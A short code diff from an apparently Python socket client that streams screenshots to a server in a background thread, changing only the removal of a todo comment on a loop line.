@@ -40,7 +40,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
         ic(self_code)
         thread = thr.Thread(target=send_continuous_screenshots,args=(client,))
         thread.start()
-        while thread.is_alive(): # todo: issue later on, this is so the client will stop if the thread stops
+        while thread.is_alive():
             try:
                 pass
             except KeyboardInterrupt:
